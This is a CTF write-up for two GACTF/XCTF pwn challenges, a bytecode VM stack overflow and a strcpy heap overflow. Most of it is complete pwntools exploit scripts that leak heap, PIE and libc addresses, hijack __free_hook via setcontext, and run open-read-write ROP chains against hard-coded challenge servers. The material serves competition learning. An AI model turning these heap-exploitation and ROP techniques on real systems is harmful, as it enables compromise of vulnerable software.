# GACTF-XCTF
## vmpwn

- VM stack buffer overflow to execute arbitrary bytecode.
- Leak libc from vtable using write syscall.
- change free vtable to open
- open-read-write to FLAG.

#### Exploit
```python
#!/usr/bin/env python3
from pwn import *

####Utils
def sendname(name):
	io.sendafter("is your name:",name)

def say(data):
	io.sendafter("say:",data)

"""
|============================================================================|
| VM stack bufferoverflow, execution of arbitrary byte code. ORW to get flag.|
|============================================================================|
"""

####Addr
pie_offset_leak = 0x203851
input_offset = 0x2d68
free_offset = 0x2038f8
__libc_free = 0x84540
open = 0xf70f0

####Exploit
#io = process(["./V"])
io = remote("207.246.82.76",8666)
sendname(b"A"*0xee+b"BB")
io.recvuntil("BB")
heap_base = u64(io.recvn(6)+b"\x00\x00")-0x50
print(f"Heap base: {hex(heap_base)}")
say("A"*0x100+"C")
sendname(b"A"*0xfe+b"BB")
io.recvuntil("BB")
pie_leak = u64(io.recvn(6)+b"\x00\x00")
pie_base = pie_leak-pie_offset_leak
print(f"Pie base: {hex(pie_base)}")
say(b"A".ljust(0x100,b"\x00")+b"C")
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode = b"\x11"+p64(pie_base+free_offset)
bytecode += b"\x8f\x02"
bytecode += b"\x11"+p64(pie_base+0x203843)
bytecode += b"\x7f"
say(bytecode.ljust(0x100,b"\x00"))
io.recvline()
libc_leak = u64(io.recvline().strip()+b"\x00\x00")
libc_base = libc_leak-__libc_free
print(f"Libc base: {hex(libc_base)}")
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode2 = b"\x11"+p64(pie_base+free_offset)
bytecode2 += b"\x67\x00"
say(bytecode.ljust(0x100,b"\x00")+p64(pie_base+0x203843))
sendname(b"A"*0x100+p64(heap_base+input_offset))
bytecode = b"\x12"+p64(pie_base+free_offset)
bytecode += b"\x13"+p64(0x100)
bytecode += b"\x11"+p64(0x0)
bytecode += b"\x8f\x00"
bytecode += b"\x11"+p64(pie_base+free_offset+0x8)
bytecode += b"\x12"+p64(0x0)
bytecode += b"\x8f\x03"
bytecode += b"\x12"+p64(pie_base+free_offset+0x10)
bytecode += b"\x11"+p64(0x3)
bytecode += b"\x13"+p64(0x50)
bytecode += b"\x8f\x00"
bytecode += b"\x11"+p64(pie_base+free_offset+0x10)
bytecode += b"\x8f\x02"
say(bytecode)
io.send(p64(libc_base+open)+b"flag")
io.interactive()
```

# Card

- Heap overflow because of call to strcpy.
- Leak libc by pointing stdout file structure in libc as tcache linked list. Use unsortedbin here to get libc address. 1/16 chances. (bruteforce)
- Get heap leaks and libc leaks by change flags and set _IO_write_base - partialoverwrite to main arena address leak heap and libc.
- __free_hook -> setcontext
- ORW ROP chain -> flag.
- WinWin

#### Exploit
```python
#!/usr/bin/env python3
from pwn import *

####Utils
def newcard(size):
	io.sendlineafter("Choice:","1")
	io.sendlineafter("Size: ",str(size))

def editcard(idx,data):
	io.sendlineafter("Choice:","2")
	io.sendlineafter("Index: ",str(idx))
	io.sendafter("Message: ",data)

def deletecard(idx):
	io.sendlineafter("Choice:","3")
	io.sendlineafter("Index:",str(idx))

def secretcard(idx,data):
	io.sendlineafter("Choice:","5")
	io.sendlineafter("Index: ",str(idx))
	io.sendafter("Message: ",data)

##############################################################################################################
# String related operations are harmfull. Strcpy creates heap buffer overflow. glibc-2.31. This was a fairly #
# Simple challenge. Just reusing chunks and things. BInary doesn't has view function. So I point unsortedbin #
# fd -> to stdout_structure as a tcache singly linked list in glibc. Which is only 4 bits of bruteforcing.   #
# 1/16 Success rate. I change __free_hook -> setcontext gadget and ROP chain to ORW. (Seccomp is just pain.) #
##############################################################################################################

####Addr
stdout_struct = 0x1ec6a0
_IO_2_1_stdin_ = 0x1eb980
free_hook = 0x1eeb28
system = 0x55410
setcontext = 0x580a0
free = 0x9d850
leak_offset = 0x1ebc20
pop_rsp = 0x16114a
syscall = 0x110b39
pop_rax = 0x4a637
pop_rsi = 0x15f2c3
pop_rdi = 0x163ccc
pop_rdx = 0x16276f
add_rsp = 0x144938

####Exploit
while True:
	io = process(["./card"],env={"LD_PRELOAD":"./libc.so.6"})
#	io = remote("45.77.72.122",9777)
	for i in range(4):
		newcard(0x28) #0~3
	newcard(0x258) #4
	newcard(0x18) #5
	newcard(0x78) #6
	newcard(0x218) #7
	newcard(0x28) #8
	for i in range(7):
		newcard(0x258) #9~15
	for i in range(9,16):
		deletecard(i)
	print("Trying")
	editcard(4,b"A"*0x28+p16(0x231))
	editcard(7,b"A"*0x28+p8(0xc1)+b"\x00")
	editcard(0,b"A"*0x28)
	deletecard(4)
	deletecard(1)
	newcard(0xb8) #1
	secretcard(1,p64(0x0)*5+p64(0x31)+p64(0x0)*5+p64(0x31)+p64(0x0)*5+p64(0x421)+p16(0x96a0))
	deletecard(0)
	deletecard(2)
	deletecard(3)
	secretcard(1,p64(0x0)*5+p64(0x31)+p64(0x0)*5+p64(0x31)+p8(0x60))
	try:
		for i in range(3):
			newcard(0x28) #0,2,3
		print("Libc")
		secretcard(3,p64(0xfbad1800)+p64(0x0)*3+p16(0x8be0))
		heap_base = u64(io.recvn(0x40)[0x1:0x9])-0xc90
		libc_leak = u64(io.recvn(0x100)[0x11:0x19])
		libc_base = libc_leak-leak_offset
		if libc_base&0xfff==0:
			print("Found")
			break
		else:
			io.close()
			continue
	except:
		io.close()
		continue
print(f"Heap base: {hex(heap_base)}")
print(f"Libc base: {hex(libc_base)}")
print(f"__free_hook: {hex(libc_base+free_hook)}")
print(f"Set context: {hex(libc_base+setcontext)}")
print(f"Free: {hex(libc_base+free)}")
print(f"__io_2_1_stdout_: {hex(libc_base+stdout_struct)}")
deletecard(8)
deletecard(0)
editcard(1,p64(0x6161616161616161)*12+p64(libc_base+free_hook))
for i in range(2):
	newcard(0x28) #0&4
editcard(4,p64(libc_base+setcontext))
editcard(7,b"A"*0xe0+p64(heap_base+0x290))
editcard(7,b"A"*0xaf+b"\x00")
editcard(7,b"A"*0xa8+p64(libc_base+syscall))
editcard(7,b"A"*0xa7+b"\x00")
editcard(7,b"A"*0xa0+p64(heap_base+0x820))
for i in range(6):
	editcard(7,b"A"*(0x8f-i)+b"\x00")
editcard(7,b"A"*0x77+b"\x00")
editcard(7,b"A"*0x70+p64(heap_base+0x820))
for i in range(8):
	editcard(7,b"A"*(0x6f-i)+b"\x00")
editcard(7,b"A"*3+b"flag"+b"\x00")
editcard(7,p64(libc_base+syscall))
deletecard(7)
ROP  =  p64(libc_base+pop_rdi)+p64(heap_base+0x8e8)+\
	p64(libc_base+pop_rsi)+p64(0x0)+\
	p64(libc_base+pop_rdx)+p64(0x0)+p64(0x0)+\
	p64(libc_base+pop_rax)+p64(0x2)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rdi)+p64(0x3)+\
	p64(libc_base+pop_rsi)+p64(heap_base)+\
	p64(libc_base+pop_rdx)+p64(0x50)+p64(0x0)+\
	p64(libc_base+pop_rax)+p64(0x0)+\
	p64(libc_base+syscall)+\
	p64(libc_base+pop_rax)+p64(0x1)+\
	p64(libc_base+pop_rdi)+p64(0x1)+\
	p64(libc_base+syscall)+\
	b"flag\x00"
io.send(ROP)
io.interactive()
```
